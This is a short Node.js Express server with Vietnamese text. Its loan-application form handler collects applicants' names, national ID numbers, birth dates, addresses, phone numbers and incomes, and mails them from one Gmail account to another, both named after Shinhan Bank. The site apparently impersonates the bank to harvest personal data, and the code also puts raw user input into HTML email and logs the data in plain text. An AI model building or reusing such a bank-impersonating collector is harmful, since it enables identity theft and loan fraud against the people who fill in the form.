const express = require('express');
const exphbs = require('express-handlebars');
var mailer = require('./utils/mailer');
const app = express();
var bodyParser = require('body-parser');
var jsonParser = bodyParser.json();
app.use(bodyParser.urlencoded({ extended: false }))
app.engine('handlebars', exphbs());
app.set('view engine', 'handlebars');
app.use('/public',express.static(__dirname + '/public'));
app.get('/', function (req, res) {
    res.render('home');
});

app.post('/dangki',jsonParser, function(req, res)
{
    console.log(req.body);
    const customer=
    {
        ten: req.body.name,
        coquan: req.body.coquan,
        sdt: req.body.sodienthoai,
        diachi: req.body.diachi,
        thunhap: req.body.thunhap,
        sotien: req.body.sotien,
        socmnd: req.body.socmnd,
        ngaysinh: req.body.ngaysinh,
        hinhthuc: req.body.hinhthuc
    }
    res.json();
    mailer.send({
        from: 'shinhanbankautomail@gmail.com',
        to: `vayshinhanbankvn@gmail.com`,
        subject: 'Thông tin vay vốn của khách hàng',
        html: `
        Xin chào, dưới đây là thông tin liên lạc của khách hàng gửi cho bạn từ trang web shinhanbank<br>
        Họ tên khách hàng: ${customer.ten}<br> 
        Ngày sinh: ${customer.ngaysinh}<br> 
        Số điện thoại: ${customer.sdt}<br> 
        Địa chỉ: ${customer.diachi}<br> 
        Cơ quan: ${customer.coquan}<br> 
        Số chứng minh nhân dân:${customer.socmnd}<br> 
        Thu nhập hàng tháng: ${customer.thunhap}<br>
        Số tiên cần vay:${customer.sotien}<br> 
        Hình thức nhận: ${customer.hinhthuc}<br>
        (Đây là thư tự động vui lòng không phản hồi)
        `
    });
});




const PORT = 3000;
app.listen(PORT,function(){
    console.log(`Server is running at http://localhost:${PORT}`);
})